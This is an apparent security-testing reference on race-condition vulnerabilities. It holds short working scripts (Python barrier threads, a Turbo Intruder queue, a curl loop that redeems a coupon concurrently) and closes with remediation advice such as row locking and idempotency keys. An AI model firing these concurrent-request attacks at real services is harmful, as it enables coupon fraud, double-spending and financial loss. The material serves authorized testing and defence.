# API Reference: Race Condition Vulnerability Testing

## Types of Race Conditions

| Type | Description | Example |
|------|-------------|---------|
| TOCTOU | Time-of-check to time-of-use | Balance check then debit |
| Double-spend | Multiple withdrawals before balance update | Gift card reuse |
| Limit bypass | Concurrent requests bypass rate limits | Coupon reuse |
| State mutation | Concurrent writes corrupt state | Inventory overselling |

## Python Threading for Concurrent Requests

### Barrier Synchronization
```python
import threading
barrier = threading.Barrier(10)

def worker():
    barrier.wait()  # All threads release simultaneously
    requests.post(url, json=data)

threads = [threading.Thread(target=worker) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
```

## Turbo Intruder (Burp Suite)

### Race Condition Script
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

## HTTP/2 Single-Packet Attack

### Concept
Send multiple requests in a single TCP packet using HTTP/2 multiplexing
to eliminate network jitter and maximize race window.

### curl Example
```bash
# Send 10 requests simultaneously via HTTP/2
for i in $(seq 1 10); do
    curl -X POST https://target/api/redeem \
        -H "Content-Type: application/json" \
        -d '{"coupon": "SAVE50"}' &
done
wait
```

## Analysis Indicators

| Indicator | Meaning |
|-----------|---------|
| Multiple 200 responses | Operation executed multiple times |
| Different response bodies | State changed between requests |
| Mixed status codes | Inconsistent handling |

## Common Vulnerable Operations

| Operation | Impact |
|-----------|--------|
| Coupon/voucher redemption | Financial loss |
| Money transfer | Double-spend |
| Like/vote submission | Manipulation |
| Account creation | Duplicate accounts |
| File upload | Overwrite race |

## Remediation
1. Use database-level locking (`SELECT ... FOR UPDATE`)
2. Implement idempotency keys
3. Use atomic operations (e.g., `UPDATE balance = balance - X WHERE balance >= X`)
4. Apply distributed locks (Redis SETNX)
5. Implement optimistic concurrency (version fields)
